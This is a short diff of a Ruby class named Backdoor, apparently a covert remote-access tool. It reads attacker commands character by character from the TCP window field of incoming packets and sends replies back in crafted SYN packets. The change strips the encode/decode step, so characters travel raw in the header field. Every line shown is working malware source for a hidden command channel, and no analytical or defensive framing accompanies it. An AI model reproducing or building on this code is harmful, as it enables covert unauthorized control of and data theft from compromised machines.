@@ -50,9 +50,9 @@ class Backdoor
                 @command = ""
             else
                 if @command.nil? then
-                    @command = decode(packet.tcp_win.chr)
+                    @command = packet.tcp_win.chr
                 elsif
-                    @command << decode(packet.tcp_win.chr)
+                    @command << packet.tcp_win.chr
                 end
             end # if
         end # if
@@ -69,7 +69,7 @@ class Backdoor
             tcp.tcp_src = rand(0xfff - 1024) + 1024
             tcp.tcp_dst = @conf_array[3].to_i
             tcp.tcp_flags.syn = 1
-            tcp.tcp_win = encode(word)
+            tcp.tcp_win = word
             tcp.tcp_seq = rand(0xffff)
             tcp.ip_saddr = packet.ip_daddr
             tcp.ip_daddr = packet.ip_saddr
